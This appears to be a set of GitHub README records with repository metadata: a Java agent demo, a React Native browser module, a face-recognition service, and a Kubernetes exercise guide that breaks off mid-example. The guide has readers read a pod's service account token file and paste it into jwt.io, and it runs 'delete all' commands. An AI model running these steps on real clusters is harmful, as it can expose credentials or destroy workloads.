		- If the vanilla class has sufficient javadoc (through parchment), this can be skipped. Our javadoc should link to the parchment javadoc.
	- The goal of all mixins targeting the class.
- Any merged mixins _**must**_ have tests associated with them. 
	- If a mixin is ""untestable"" its test class should have a comment explaining *why* it's untestable. 
		- Optionally a to-do (project task? issue?) suggesting integration tests when possible.
	- All non-trivial mixins _**must**_ have a comment explaining their purpose.
	- _**Must**_ pass checkstyle.
	- _**Must**_ build.
	- All tests _**must**_ pass (no regressions).
	-  //todo Investigate code coverage for mixin tests ([jacoco?](https://docs.gradle.org/current/userguide/jacoco_plugin.html) [other link maybe it's bad](https://igorski.co/generating-junit-test-coverage-using-gradle-and-jacoco/)) .
- Any non-mixin class _**must**_ have tests associated with it.
	- The tests should reasonably cover all expected usage of the class (its external api).
	- Any method(s) that can be reasonably unit tested _**must**_ be.
(TODO more contributing docs)
",0,8,1,mit,32.0
swan-io/react-native-browser,main,"# @swan-io/react-native-browser

An easy-to-use in-app browser module for React Native, powered by **[Chrome Custom Tabs](https://developer.chrome.com/docs/android/custom-tabs)** / **[SFSafariViewController](https://developer.apple.com/documentation/safariservices/sfsafariviewcontroller)**.

[![mit licence](https://img.shields.io/dub/l/vibe-d.svg?style=for-the-badge)](https://github.com/swan-io/react-native-browser/blob/main/LICENSE)
[![npm version](https://img.shields.io/npm/v/@swan-io/react-native-browser?style=for-the-badge)](https://www.npmjs.org/package/@swan-io/react-native-browser)
[![bundlephobia](https://img.shields.io/bundlephobia/minzip/@swan-io/react-native-browser?label=size&style=for-the-badge)](https://bundlephobia.com/result?p=@swan-io/react-native-browser)
<br />
[![platform - android](https://img.shields.io/badge/platform-Android-3ddc84.svg?logo=android&style=for-the-badge)](https://www.android.com)
[![platform - ios](https://img.shields.io/badge/platform-iOS-000.svg?logo=apple&style=for-the-badge)](https://developer.apple.com/ios)

<p>
  <img width=""261"" src=""./docs/demo.png"" alt=""Demo"">
</p>

## Installation

```bash
$ yarn add @swan-io/react-native-browser
# --- or ---
$ npm install --save @swan-io/react-native-browser
```

## Quickstart

```tsx
import { openBrowser } from ""@swan-io/react-native-browser"";
import { useCallback } from ""react"";
import { Button, SafeAreaView } from ""react-native"";
import parseUrl from ""url-parse"";

const App = () => {
  const handleOnPress = useCallback(() => {
    openBrowser(""https://swan.io"", {
      onClose: (url) => {
        if (url) {
          const { protocol, host, query } = parseUrl(url, true);
          const origin = `${protocol}//${host}`;

          if (origin === ""com.company.myapp://close"") {
            console.log(JSON.stringify(query, null, 2));
          }
        }
      },
    }).catch((error) => {
      console.error(error);
    });
  }, []);

  return (
    <SafeAreaView>
      <Button title=""Open browser"" onPress={handleOnPress} />
    </SafeAreaView>
  );
};
```

## API

### openBrowser(url: string, options: Options)

```tsx
import { openBrowser } from ""@swan-io/react-native-browser"";

openBrowser(""https://swan.io"", {
  animationType: """", // ""fade"" | ""slide"" (default to ""slide"")
  dismissButtonStyle: ""close"", // ""cancel"" | ""close"" | ""done"" (default to ""close"")
  barTintColor: ""#FFF"", // in-app browser UI background color
  controlTintColor: ""#000"", // in-app browser buttons color
  onOpen: () => {
    // fired on browser opened
    // useful to switch the StatusBar color, for example
  },
  onClose: (url) => {
    // fired on browser closed
    // url will be defined if the browser has been closed via deeplink
  },
}).catch((error) => {
  console.error(error);
});
```

> [!IMPORTANT]
> On Android, the Chrome app must be opened at least once for this to work — a step often overlooked when using emulators in development.

## Handle deeplinks

In order to receive deeplink on browser close event, you have to setup them first. We **highly** recommand defining a custom schema + url for this specific task. For example, `com.company.myapp://close`.

### On iOS

First, you need to **[enable react-native deeplinks support](https://reactnative.dev/docs/linking#enabling-deep-links)**. Then, edit your `Info.plist` file to add:

```xml
<key>CFBundleURLTypes</key>
<array>
  <dict>
    <key>CFBundleTypeRole</key>
    <string>Viewer</string>
    <key>CFBundleURLName</key>
    <string>com.company.myapp</string>
    <key>CFBundleURLSchemes</key>
    <array>
      <string>com.company.myapp</string>
    </array>
  </dict>
</array>
```

### On Android

Edit your `AndroidManifest.xml` to add ([more documentation](https://developer.android.com/training/app-links/deep-linking)):

```xml
<activity android:name="".MainActivity"">
  <intent-filter>
    <action android:name=""android.intent.action.VIEW"" />
    <category android:name=""android.intent.category.BROWSABLE"" />
    <category android:name=""android.intent.category.DEFAULT"" />
    <data android:scheme=""com.company.myapp"" android:host=""close"" />
  </intent-filter>
</activity>
```

> [!TIP]
> Once the redirect URL is visited (a `GET` hits your server), handle the result and perform a server redirect to `com.company.myapp://close?success=true` to close the browser (and pass any data back to your app using query params ✨).

## Run the example app

```bash
$ git clone git@github.com:swan-io/react-native-browser.git
$ cd react-native-browser/example

$ yarn install && yarn start
# --- or ---
$ npm install && npm run start
```
",9,1,1,mit,7.0
JAgentSphere/bytebuddy-agent-demo,main,"# Agent-Demo

使用 Byte Buddy 和 Gradle 构建一个最简单的 Java Agent

Java Agent 的入口类是 `com.jas.agent.Main`

```java
public class Main {
    public static void premain(String args, Instrumentation inst) {
        launch(args, inst);
    }

    public static void agentmain(String args, Instrumentation inst) {
        launch(args, inst);
    }

    private static void launch(String args, Instrumentation inst) {
        System.out.println(""hello java agent"");
    }
}
```

提供 AgentBuilder 最简化便利测试的配置项

```java
AgentBuilder agentBuilder = new AgentBuilder.Default()
        .ignore(ElementMatchers.none()) // 忽略空，即允许 hook 所有类
        .with(AgentBuilder.RedefinitionStrategy.REDEFINITION) // 开启类被加载后也允许进行字节码修改
        .with(AgentBuilder.Listener.StreamWriting.toSystemError().withErrorsOnly()) // 字节码修改失败打印错误信息到控制台
        .with(AgentBuilder.Listener.StreamWriting.toSystemOut().withTransformationsOnly()) // 字节码修改成功也输出到控制台
        .with(new DumpClassListener()); // 字节码修改成功把类信息给报错到 weaving/classes 目录下
```

## 编译

在项目目录下执行如下命令，会在 test 文件夹中生成 agent.jar 和 demo.jar

```shell

# linux or macos
./gradlew jar

# windows
gradlew.bat jar
```

## 启动 Java Agent

使用如下命令挂载 agent 启动 SpringBoot 程序，会打印 `hello java agent`

```shell
cd test && \
  java -javaagent:agent.jar -jar demo.jar
```",4,0,3,mit,0.0
jlokitha/group_chat_app,master,,0,0,1,mit,0.0
YiRanMushroom/GTCEuAO,master,,55,4,2,mit,0.0
qjx378/face-service,master,"<h1 align=""center"" style=""margin: 30px 0 30px; font-weight: bold;"">人脸识别服务</h1>
<h4 align=""center"">基于Spring Boot服务架构</h4>
<p align=""center"">
  <a href=""https://gitee.com/qjx378/face-service/stargazers""><img src=""https://gitee.com/qjx378/face-service/badge/star.svg?theme=dark""></a>
  <a href=""https://gitee.com/qjx378/face-service""><img src=""https://img.shields.io/badge/FaceService-v0.0.1-brightgreen.svg""></a>
  <a href=""https://gitee.com/qjx378/face-service/blob/master/LICENSE""><img src=""https://img.shields.io/github/license/qjx378/face-service""></a>

</p>

## **简介**
基于开源人脸检测AI模型，通过利用Java技术和向量搜索技术提供包括人脸检测与分析、比对、搜索、验证、五官定位、活体检测等API接口服务功能，为开发者和企业提供高性能高可用的人脸识别服务。可应用于在线娱乐、在线身份认证等多种应用场景，充分满足各行业客户的人脸属性识别及用户身份确认等需求。
<br><br>
关于中科视拓开源人脸模型（SeetaFace6），您可以访问[https://github.com/SeetaFace6Open/index](https://github.com/SeetaFace6Open/index)了解更多。
<br>
SeetaFace6入门教程[https://github.com/seetafaceengine/SeetaFaceTutorial](https://github.com/seetafaceengine/SeetaFaceTutorial)了解更多。

## **技术架构**
基于Spring Boot+MySQL+Milvus的技术组合，接口采用RESTful API定义，通过JNI（Java Native Interface）技术调用底层的人脸识别模型，实现人脸的检测与识别。

## **接口范围**
本API服务主要专注于提供包括人脸检测与分析、比对、搜索、验证、五官定位、活体检测等API接口服务，在该API服务中实现人脸检测与分析、五官定位、人脸比对、人脸库管理、人脸搜索、人脸静态活体检测，主要包括如下API对外接口：

1）人脸检测与分析<br>
对请求图片检测返回人脸的位置、面部属性；对请求图片进行五官定位，计算构成人脸轮廓的68个点

2）人脸比对<br>
对两张图片中的人脸进行相似度比对，返回人脸相似度分数。

3）人脸库管理<br>
包括增、删人脸库，人脸库增、删人脸。

3）人脸搜索<br>
给定一张待识别的人脸图片，在一个或多个人脸库中识别出最相似的前 N 个人脸。

4）人脸静态活体检测<br>
对用户上传的静态图片进行防翻拍活体检测，以判断是否是翻拍图片。

# **系统需求**
JDK >= 21 <br>
Maven >= 3.0 <br>
MySQL >= 8.0 <br>
Milvus >= 2.3

# **技术选型**
- 系统环境 <br>
Java EE 21 <br>
Servlet 6.0 <br>
Apache Maven 3

- 主框架 <br>
Spring Boot 3.2.x <br>
Spring Framework 6.0.x <br>

- 持久层 <br>
Spring JDBC

## **部署方式**
1. 下载模型文件（百度网盘：https://pan.baidu.com/share/init?surl=LlXe2-YsUxQMe-MLzhQ2Aw 提取码：ngne），将下载的所有*.csta模型文件放入某个路径下，在启动服务前，修改spring配置文件中的app.seetaface.model-path属性，指向存放模型文件夹的路径。
2. 修改spring配置文件中的face-image-path，用于存放人脸图片的文件夹。

## 在线体验
演示地址：[https://face.izerofx.com](https://face.izerofx.com/)
- 服务器配置较低，对体验有一定的影响。

## **演示图**
注：该工程不包含示例页面，以下示例页面UI、素材取自网络，仅用于演示使用。
<table>
    <tr>
        <td><img src=""https://res.file.izerofx.com/face-service/1.png""/></td>
        <td><img src=""https://res.file.izerofx.com/face-service/2.png""/></td>
    </tr>
    <tr>
        <td><img src=""https://res.file.izerofx.com/face-service/3.png""/></td>
        <td><img src=""https://res.file.izerofx.com/face-service/4.png""/></td>
    </tr>
</table>
",0,4,1,apache-2.0,0.0
seifrajhi/Kubernetes-practical-exercises-Hands-on,main,"# Practical Kubernetes Exercices

This repo provides some resources to learn Kubernetes through practical exercises for self study to learn how easy it is to understand and master Kubernetes complexity and problems.

Kubernetes is easy to understand, even if it looks hard at the first look on the icons or the resources map, this course is about to help you to understand K8s and learn how to start!

![icons-all](images/icons-all.png ""icons-all"")

![k8s-resources-map](images/k8s-resources-map.png ""k8s-resources-map"")


## Prerequisites

It would be nice if you know what `kubectl` is and have a basic understanding of running conatiners with docker / containerd or cri-o.

## Preparation

To get prepared please install at least kubectx and kns with krew from this list and make sure to have bash completion for kubectl in place:

## Tools we use

- [mkcert](https://github.com/FiloSottile/mkcert)
- watch  
  - Mac setup:
    ````
    brew install watch
- [oh-my-zsh](https://github.com/ohmyzsh/ohmyzsh)
  - activate autocompletion
    - [Mac setup](https://docs.brew.sh/Shell-Completion)
    - [kubectl plugin](https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/kubectl)
- [git](https://git-scm.com/)
- [kubectl](https://kubernetes.io/docs/tasks/tools/install-kubectl/)  
  - mac setup:
    ```
    brew install kubernetes-cli
- [kubectx & kubens](https://github.com/ahmetb/kubectx)


[The Golden Kubernetes Tooling and Helpers list](http://bit.ly/kubernetes-tooling-list)

We can use any Kubernetes cluster (> 1.21) on our local machine or in the cloud. For online trainings we recommend to have either k3s installed with k3d, use Kind, or Docker for Desktop.  

We'll use some slides from:

[Kubernauts Kubernetes Trainings Slides](https://goo.gl/Hzk2sd)

and refer to some resources from:

[Kubernauts Kubernetes Learning Resources List](https://goo.gl/Rywkpd)

## Kubernetes  Guides

### Networking

The purpose of [this website](https://www.tkng.io/) is to provide an overview of various Kubernetes networking components with a specific focus on exactly how they implement the required functionality.

The guide is split into multiple parts which can be studied mostly independently, however they all work together to provide a complete end-to-end cluster network abstractions.

Where possible, every topic in this guide will include a dedicated [hands-on labs](https://www.tkng.io/lab/) which can be spun up locally in a matter of minutes. 

### Security
 
The Security checklist aims at providing a basic list of guidance with links to more comprehensive documentation on each topic. It does not claim to be exhaustive and is meant to evolve.

1- https://kubernetes.io/docs/concepts/security/security-checklist/

2- https://github.com/magnologan/awesome-k8s-security

3- https://github.com/freach/kubernetes-security-best-practice

4- https://medium.com/@seifeddinerajhi/kubernetes-security-assessment-guidelines-and-necessary-checklist-9a326f341b68

5- https://medium.com/@seifeddinerajhi/owasp-kubernetes-top-10-a-comprehensive-guide-f03af6fd66ed

6- https://eksclustergames.com:  Kubernetes CTF (Capture The Flag) challenges for EKS.

7- https://github.com/andifalk/secure-development-on-kubernetes: Slides and Demos for ""Secure Development on Kubernetes"" talk


7- [A curated list for Awesome Kubernetes Security resources](https://github.com/magnologan/awesome-k8s-security) - A curated list for Kubernetes (K8s) Security resources such as articles, books, tools, talks and videos.


8- [Kubernetes Security Checklist and Requirements](https://github.com/Vinum-Security/kubernetes-security-checklist) - Kubernetes Security Checklist and Requirements - All in One (authentication, authorization, logging, secrets, configuration, network, workloads, dockerfile).

9- [Kubernetes Hardening Manual](https://github.com/seifrajhi/kubernetes-hardening-checklist-guidance) -  Kubernetes Hardening Guidance.


### Storage

- The key concepts of Kubernetes storage, including [PVs, PVCs, and StorageClass](https://medium.com/@seifeddinerajhi/understanding-storage-in-kubernetes-ee2c19001aae)

### Misc

- Kelsey Hightower's open-source guide, [Kubernetes the Hard Way](https://github.com/kelseyhightower/kubernetes-the-hard-way), goes through how to bootstrap a Kubernetes cluster without the use of installers or scripts. 


- [Learnk8s](https://learnk8s.io/): Develop the knowledge and skills to get the most out of Kubernetes with hands-on online courses and instructor-led classes.

- [Introduction to Kubernetes Lecture Notes](https://github.com/kaan-keskin/introduction-to-kubernetes/tree/main): Notes about Kubernetes resources  

- [Kubernetes Handbook](https://github.com/rootsongjc/kubernetes-handbook)

- [Kubeapps](https://github.com/vmware-tanzu/kubeapps): A web-based UI for deploying and managing applications in Kubernetes clusters

- [Start learning Kubernetes today](https://kubebyexample.com/)

- [Step by step guide to learning Kubernetes](https://roadmap.sh/kubernetes)

- [Kubernetes the Harder Way](https://github.com/ghik/kubernetes-the-harder-way) A guide to setting up a production-like Kubernetes cluster on a local machine


- [Kubernetes mind map](https://betterprogramming.pub/6-important-things-you-need-to-run-kubernetes-in-production-d573d61258c5): 6 Important Things You Need to Run Kubernetes in Production.

- [Awesome Kubernetes Resources](https://github.com/tomhuang12/awesome-k8s-resources) - A curated list of awesome Kubernetes tools and resources.

### Useful aliases

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
alias k=""kubectl""
alias kx=""kubectx""
alias kn=""kubens""
alias kgp=""kubectl get pods""
alias kgel=""k get events --sort-by=.metadata.creationTimestamp""
```
</p>
</details>


## Kubectl CheatSheet and Goodies

https://kubernetes.io/docs/reference/kubectl/cheatsheet/

https://github.com/dennyzhang/cheatsheet-kubernetes-A4

<details><summary>Expand here to see the solution</summary>
<p>

```bash
k get events --sort-by=.metadata.creationTimestamp # List Events sorted by timestamp

k get services --sort-by=.metadata.name # List Services Sorted by Name

k get pods --sort-by=.metadata.name

k get endpoints

k explain pods,svc

k get pods -A # --all-namespaces 

k get nodes -o jsonpath='{.items[*].spec.podCIDR}'

k get pods -o wide

k get pod my-pod -o yaml --export > my-pod.yaml  # Get a pod's YAML without cluster specific information

k get pods --show-labels # Show labels for all pods (or other objects)

k get pods --sort-by='.status.containerStatuses[0].restartCount'

k cluster-info

k api-resources

k api-resources -o wide

kubectl api-resources --verbs=list,get # All resources that support the ""list"" and ""get"" request verbs

k get apiservice
```
</p>
</details>

### k create namespace imperative via declarative

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k create ns <namespace name, e.g. your name or your project!>
k create ns --dry-run test -o yaml > test-ns.yaml
k create -f test-ns.yaml
k delete ns test
```

</p>
</details>

### k create / run pods or deploymens with dry-run

<details>
   <summary>Expand here to see the solution</summary>
<p>

```yaml
# old school (going to get deprecated)
k run --generator=run-pod/v1 <pod name> --image=<image name> --dry-run -o yaml > <podname.yaml>

k run --generator=run-pod/v1 ""nginx-pod"" --image=nginx -o yaml --dry-run > nginx-pod.yaml

or

k run --restart=Never <pod name> --image=<image name> --dry-run -o yaml > <podname.yaml>

or (new school with --dry-run=client)

k run nginx-pod --image=nginx -o yaml --dry-run=client > nginx-pod.yaml

k create <object> <name> <options> --dry-run -o yaml > <objectname.yaml>

k create deployment nginx-deployment --image=nginx --dry-run -o yaml > nginx-deployment.yaml

cat nginx-pod.yaml

cat nginx-deployment.yaml

k create -f nginx-pod.yaml

# create a service via exposing the pod

k expose pod nginx-pod --port=80

k get svc

k port-forward service/nginx-pod 8080:80

or

k proxy

open http://127.0.0.1:8001/api/v1/namespaces/default/pods/nginx-pod/proxy/

# open a new terminal session

curl http://127.0.0.1:8080/

k delete all --all # with caution!!!

k create -f nginx-deployment.yaml

k get all

k get all -A

k expose deployment nginx-deployment --port=80

k port-forward service/nginx-deployment 8080:80

k scale --replicas 3 deployment nginx-deployment

k edit deployment nginx-deployment

vi nginx-deployment.yaml # adapt the number of replicas, e.g. to 2

k apply -f nginx-deployment.yaml

```
</p>
</details>

### k get events and logs, describe objects

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
kx
kn
k delete all --all # with caution!!!
k apply -f 0-nginx-all.yaml
k get all
# where is the ingress?
k get ingress # ingress objects are not namespaced
k get events
k get events -A
k get events -n <namespace name>
k logs nginx-<press tab>
k describe pod nginx-<press tab>
k describe deployment nginx
k describe replicasets nginx-<press tab>
```
</p>
</details>

### Merging contexts (e.g. merge 2 kubeconfigs from 2 cluster contexts)

Sometimes you'll need to merge multiple kubeconfigs into a single file, here you go:

<details><summary>Expand here to see the solution</summary>
<p>

```bash
KUBECONFIG=file1:file2:file3 kubectl config view --merge --flatten > my_new_kubeconfig
or
cp ~/.kube/config ~/.kube/config.bak
KUBECONFIG=/my/new/kubeconfig:~/.kube/config.bak kubectl config view --flatten > my_new_kubeconfig
# test it
export KUBECONFIG=my_new_kubeconfig
kx
cp my_new_kubeconfig ~/.kube/config
```
</p>
</details>

Don't miss: Mastering the KUBECONFIG file by Ahmet Alp Balkan:

https://ahmet.im/blog/mastering-kubeconfig/

### Kubernetes Secrets are not secret

Secrets are resources containing keys with base64 encoded values. Secrets are not encrypted by default, they are only encoded and can get decoded easily by everyone who has access to a namespace or to the whole cluster.

Secret values can be exposed to pods as environment variables or mounted as files.

In order to create a secret from a text file, you can run the following, This creates a generic secret named secretname and automatically encodes the value as base64:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
echo -n ""yourvalue"" > ./secret.txt
k create secret generic secretname --from-file=./secret.txt
k describe secrets secretname
k get secret secretname -o yaml
echo 'eW91cnZhbHVl' | base64 --decode
# or
k create secret generic mysecret --dry-run -o yaml --from-file=./secret.txt > secret.yaml
k create -f secret.yaml
# or
k create secret generic mysecret --dry-run -o yaml --from-literal=secret.txt=yourvalue > secret.yaml
```
</p>
</details>

#### Further reading:

Since K8s secrets are not so secret, there are some ways to keep you secrets secret:

https://learnk8s.io/kubernetes-secrets-in-git

https://kubernetes.io/docs/tasks/inject-data-application/distribute-credentials-secure/#create-a-pod-that-has-access-to-the-secret-data-through-environment-variables



### Kubernetes ConfigMaps

A ConfigMap is an object consisting of key-value pairs which can be injected into your application.

With a ConfigMap you can separate configuration from your Pods. This way, you can prevent hardcoding configuration data.

ConfigMaps are useful for storing and sharing non-sensitive, unencrypted configuration information. Sensitive information should be stored in a Secret instead.

Exercise:

Create a ConfigMap named kubernauts that contains a key named dev with the value ops.

With the --from-literal argument passed to the k create configmap command you can create a ConfigMap containing a text value.

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k create cm kubernauts --from-literal=dev=ops --dry-run -o yaml > cm-kubernauts.yaml
cat cm-kubernauts.yaml
echo -n ""ops"" > dev
k create cm kubernauts --from-file=./dev
k get cm
k describe cm kubernauts
k delete cm kubernauts
k create -f cm-kubernauts.yaml
k describe cm kubernauts
```
</p>
</details>

Using this ConfigMap, we can inject data in our application:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cat 0-nginx-configmap.yaml
k create -f 0-nginx-configmap.yaml
```
</p>
</details>



## Whoami, Whoareyou and Whereami Problems

### What We’ll Do

We’ll use a pre-made container — containous/whoami — capable of telling you where it is hosted and what it receives when you call it.

If you'd like to build the container image with docker, do:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
git clone https://github.com/containous/whoami.git
docker build -t whoami .
docker tag whoami kubernautslabs/whoami
docker push kubernautslabs/whoami
docker images | head
```

</p>
</details>

We’ll define two different deployments, a whoami and a whoareyou deployment that will use `containous/whoami` container image.

We’ll create a deployment to ask Kubernetes to deploy 2 replicas of whoami and 3 replicas of whoareyou.

We’ll define two services, one for each of our Pods.

We’ll define Ingress objects to define the routes to our services to the outside world.

We’ll use our Nginx Ingress Controller on our Rancher Cluster.

Explanations about the file content of whoami-deployment.yaml:

We define a “deployment” (kind: Deployment)

The name of the object is “whoami-deployment” (name: whoami-deployment)

We want two replica (replicas: 2)

It will deploy pods that have the label app:whoami (selector: matchLabels: app:whoami)

Then we define the pods with the (template: …) which will have the whoami label (metadata:labels:app:whoami)

The Pods will host a container using the image containous/whoami (image:containous/whoami)

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k apply -f 1-whoami-deployment.yaml
k get all
# we expose the deployment with a service of type ClusterIP
k create -f 1-whoami-service-ClusterIP.yaml
k get svc
k port-forward service/whoami-service 8080:80
# in a new terminal session call
curl 127.0.0.1:8080
k delete svc whoami-service
# create a service of type NodePort
k create -f 1-whoami-service-nodeport.yaml
k get svc
curl csky08:30056 # adapt the nodeport for your env. please !
curl csky09:30056
curl csky10:30056
k delete svc whoami-service-nodeport
k create -f 1-whoami-service-loadbalancer.yaml
k get svc
curl <EXTERNAL-IP> # the external-ip is given from the LB IP pool above
k create -f 2-whoareyou-all.yml
k get all
k get svc
k get ing
curl <HOSTS value from ingress>
# are you happy? ;-)
```

</p>
</details>

## DNS based Service discovery with whereami kubia pod

### What We’ll Do

We'll use a slightly extended node.js app (which is a simple web server) from the [Kubernetes in Action book by Marko Lukša](https://www.amazon.com/-/en/Marko-Luksa/dp/1617293725) in 2 different namespaces ns1 and ns2 to demonstrate the DNS based services discovery. 

A service provides a Virtual IP (VIP) address, which means the Service IP is not bound to a physical network interface. A service acts like an internal loadbalancer in K8s! The magic of of routing trafic through the VIP is implemented by IPtable rules managed by kube-proxy!

A service can be called through its FQDN in the form of:

`$SERVICE_NAME.$NAMESPACE.svc.cluster.local`

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cd whereami
k create ns ns1
k create ns ns2
kn ns1
cat kubia-deployment.yaml   
k create -f kubia-deployment.yaml
k create -f kubia-deployment.yaml -n ns2
k expose deployment kubia
k get svc
k expose deployment kubia -n ns2
k get svc -n ns2
k exec -it kubia-<press tab> -- curl kubia.ns2.svc.cluster.local:8080
k scale deployment kubia -n ns2 --replicas 3
# repeat the service call many times and see how loadbalancing works
k exec -it kubia-<press tab> -- curl kubia.ns2.svc.cluster.local:8080
k exec -n ns2 -it kubia-<press tab> -- curl kubia.ns1.svc.cluster.local:8080
k exec -it kubia-<press tab> -- ping kubia.ns2.svc.cluster.local
--> PING kubia.ns2.svc.cluster.local (10.43.109.89) 56(84) bytes of data.
# you don't get any pong, why?
# ssh into a node and examine the IPtable rules
sudo iptables-save | grep kubia
```
</p>
</details>

### Headless Services for Stickiness

![hadless](images/headless-cluster-ip.png ""headless-cluster-ip"")

As we learned services are exposed by default through the type ClusterIP, they work as an internal layer 4 load-balancer and provide a VIP with a stable DNS address, where the clients can connect to. The service forwards the connections to one of the pods which are backing the service via round robin.

This works fine and is desired for stateless apps which need to connect to one of the pods randomly and gain more performance through trafic routing via load balancing.

But in some cases where stickiness is needed and the clients need to connect to a particular pod for session or data stickiness, then we need to define our service without ClusterIP, which is by default the head of the service (that's the VIP).

To do that we need to define our service as a `headless` service, let's see that in action with the whereami service and our utils pod.

In the following we expose the kubia deployment as a headless service by setting the ClusterIP to `None`, scale the deployment and do a DNS query to both services with `host kubia-headless` and `host kubia-clusterip` from within the util client pod. As you'll see our client pod always connects to the first IP from the DNS response, if we curl the headless service. This means no load balancing happens, the call is `Sticky`!

The second curl to the service with ClusterIP does load balancing and distributes the traffic between pods.

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k delete svc kubia
k expose deployment kubia --name kubia-headless --cluster-ip None
k expose deployment kubia --name kubia-clusterip
k expose deployment kubia --name kubia-lb --type=LoadBalancer
k scale deployment kubia --replicas 3
k run --generator=run-pod/v1 utils -it --image kubernautslabs/utils -- bash
# inside the utils container
host kubia-headless
host kubia-clusterip
# what is the difference here?
for i in $(seq 1 10) ; do curl kubia-headless:8080; done
# hits kubia only on one node? 
for i in $(seq 1 10) ; do curl kubia-clusterip:8080; done
# does load balancing via the head ;-)
exit
mkcert '*.whereami.svc'
k create secret tls whereami-secret --cert=_wildcard.whereami.svc.pem --key=_wildcard.whereami.svc-key.pem
cat kubia-ingress-tls.yaml
k create -f kubia-ingress-tls.yaml
# Please provide the host entry mapping in your /etc/hosts file like this:
# 192.168.64.23 my.whereami.svc
# the IP should be the IP of the traefik loadbalancer / ingress controller
curl https://my.whereami.svc
for i in $(seq 1 10) ; do curl https://my.whereami.svc; done
# the ingress controller does load balancing, although the kubia-headless is defined as the backend with serviceName: kubia-headless!
```

</p>
</details>

## Ingress with TLS

![ingress-controller](images/ingress-controller-traefik.png ""ingress-controller-traefik"")

Often we need to use an ingress object to provide path based or (sub-) domain based routing with TLS termination and other capabilities defined through annotations in the ingress resource.

By creating an ingress for a service, the ingress controller will create a single entry-point to the defined service in the ingress resource on every node in the cluster.

In the follwoing we're using the traefik ingress controller and an ingress object to provide path based or (sub-) domain based routing with TLS termination with a valid mkcert made TLS certificate on our lab environment.


<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cd ..
kn default
mkcert '*.ghost.svc'
k create secret tls ghost-secret --cert=_wildcard.ghost.svc.pem --key=_wildcard.ghost.svc-key.pem
# alternatively, if you can't or you don't want to use mkcert, you can create a selfsigned cert with:
# openssl genrsa -out tls.key 2048
# openssl req -new -x509 -key tls.key -out tls.cert -days 360 -subj /CN=my.ghost.svc
# k create secret tls ghost-secret --cert=tls.cert --key=tls.key
cat 3-ghost-deployment.yaml
k create -f 3-ghost-deployment.yaml
k expose deployment ghost --port=2368
cat 3-ghost-ingress-tls.yaml
k create -f 3-ghost-ingress-tls.yaml
# Please provide the host entry mapping in your /etc/hosts file like this:
# 192.168.64.23 my.ghost.svc admin.ghost.svc
# the IP should be the IP of the traefik loadbalancer / ingress controller
open https://my.ghost.svc
open https://admin.ghost.svc/ghost
# change the service type to LoadBalancer and access ghost with the loadbalancer IP on port 2368 or on any other node (works on k3s with trafik only), e.g.:
open http://node2:2368
# scale the deployment to have 2 replicas and see how the backend ghost backened https://admin.ghost.svc/ghost doesn't work.
```

</p>
</details>

## Multi-Container Pods

Create a Pod with two containers, both with image alpine and command ""echo hello; sleep 3600"". Connect to the second container and run 'ls'.

The easiest way to do it is to create a pod with a single container and save its definition in a YAML file and extend it with an additional container:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k run alpine-2-containers --image=alpine --restart=Never -o yaml --dry-run -- /bin/sh -c 'echo hello;sleep 3600' > alpine-pod.yaml
```

Copy/paste the container related values, so your final YAML should contain the following two containers (make sure those containers have a different name):

```YAML
containers:
  - args:
    - /bin/sh
    - -c
    - echo hello;sleep 3600
    image: alpine
    name: alpine1
    resources: {}
  - args:
    - /bin/sh
    - -c
    - echo hello;sleep 3600
    image: alpine
    name: alpine2
    resources: {}
```

```yaml
k create -f alpine-pod-2-containers.yaml # alpine-pod-2-containers.yaml is in this repo
# exec / ssh into to the alpine2 container
k exec -it alpine-2-containers -c alpine2 -- sh
ls
exit

# or just an one-liner
k exec -it alpine2 -c alpine2 -- ls

# cleanup
k delete pod alpine-2-containers
```

</p>
</details>


### Shared Volume

We'll extend the above alpine-2-containers with a shared volume of type emptyDir named `share` with a volumeMount for each container with a mountPath `/tmp/share1` and `/tmp/share2` as follow:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cat alpine-pod-share-volumes.yaml
k apply -f alpine-pod-share-volumes.yaml
k exec -it alpine-2-containers-share-volume -c alpine1 -- sh
touch /tmp/share1/sharefile
echo ""test-share1"" > /tmp/share1/sharefile
cat /tmp/share1/sharefile
exit
k exec -it alpine-2-containers-share-volume -c alpine2 -- cat /tmp/share2/sharefile
```

</p>
</details>

## Security

Kubernetes Security is a huge topic and security hardening is a nice problem which everyone has to implement according to their security requirements and the governance model of their organization. We're going only to scratch the surface of K8s security here and highly recommend to go through the following resources by Michael Hausenblas, Liz Rice and the community.

https://kubernetes-security.info/

https://learn.hashicorp.com/vault/getting-started-k8s/sidecar

https://github.com/k8s-sec/k8s-sec.github.io


### Service Accounts

In K8s each namespace has a default ServiceAccount, named `default`. A ServiceAccount is a namespaced resource used by containers running in a Pod, to communicate with the API server of the Kubernetes cluster. ServiceAccounts with limited permissions are often used to apply the principle of least priviledge.

```bash
k get sa --all-namespaces | grep default
k get sa default -o yaml
k get secret default-<press tab> -o yaml
```

The data key of this Secret has several key/pairs:

```yaml
apiVersion: v1
kind: Secret
data:
  ca.crt: LS0tLS1CRUdJTi...
  namespace: ZGVmYXVsdA==
  token: ZXlKaGJHY2lP...
metadata:
  annotations:
    kubernetes.io/service-account.name: default
...
```

The token is the Base64 encoding of the JWT used to authenticate against the API server.
Let's get the token and head to jwt.io and use the debugger to decode the token.

```bash
kubectl run -it alpine --restart=Never --image=alpine -- sh
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
exit
open https://jwt.io/
```

Paste the token and get the payload, which looks similar to this:

```
{
  ""iss"": ""kubernetes/serviceaccount"",
  ""kubernetes.io/serviceaccount/namespace"": ""default"",
  ""kubernetes.io/serviceaccount/secret.name"": ""default-token-24pbl"",
  ""kubernetes.io/serviceaccount/service-account.name"": ""default"",
  ""kubernetes.io/serviceaccount/service-account.uid"": ""147e134a-43d0-4c76-ad01-bccc59f8acb9"",
